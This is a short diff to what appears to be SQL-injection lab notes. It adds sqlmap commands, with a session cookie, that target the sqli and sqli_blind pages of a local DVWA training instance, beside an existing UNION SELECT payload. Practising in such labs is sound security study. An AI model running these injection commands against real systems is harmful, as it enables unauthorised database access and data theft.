@@ -52,6 +52,16 @@ UNION SELECT name,sql,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table';
 ~~~
 
 
+<br>
+
+## SQLMap
+
+~~~ bash
+sqlmap --cookie="PHPSESSID=4ppgmkccp0ie0d6b6432vp5boo; security=low" -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --current-db
+sqlmap --cookie="PHPSESSID=4ppgmkccp0ie0d6b6432vp5boo; security=low" -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=a&Submit=Submit#" -p id --current-db
+~~~
+
+
 
 
 
